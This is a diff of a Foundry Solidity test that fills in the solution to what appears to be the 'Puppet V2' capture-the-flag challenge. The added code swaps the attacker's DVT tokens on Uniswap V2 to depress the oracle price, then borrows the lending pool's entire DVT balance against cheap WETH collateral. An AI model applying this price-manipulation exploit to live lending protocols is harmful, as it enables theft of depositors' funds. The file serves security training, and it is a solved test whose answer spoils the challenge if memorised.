@@ -1,6 +1,6 @@
 // SPDX-License-Identifier: MIT
 pragma solidity >=0.8.0;
-
+ 
 import {Utilities} from "../../utils/Utilities.sol";
 import "forge-std/Test.sol";
 
@@ -104,6 +104,32 @@ contract PuppetV2 is Test {
          * EXPLOIT START *
          */
 
+        vm.startPrank(attacker);
+
+        // approve uniswap to use DVT
+        dvt.approve(address(uniswapV2Router), ATTACKER_INITIAL_TOKEN_BALANCE);
+
+        // trade all DVT for WETH
+        address[] memory path = new address[](2);
+        path[0] = address(dvt);
+        path[1] = address(weth);
+        uniswapV2Router.swapExactTokensForTokens(
+            ATTACKER_INITIAL_TOKEN_BALANCE,
+            1,
+            path,
+            attacker,
+            DEADLINE);
+
+        // approve pool to use WETH
+        /// @notice this approves and sends all of attackers weth rather than minimum necessary amount
+        weth.approve(address(puppetV2Pool), type(uint256).max);
+        weth.deposit{value: attacker.balance}();
+        
+        // borrow all DVT from pool
+        uint256 poolBalance = dvt.balanceOf(address(puppetV2Pool));
+        puppetV2Pool.borrow(poolBalance);
+        vm.stopPrank();
+        
         /**
          * EXPLOIT END *
          */
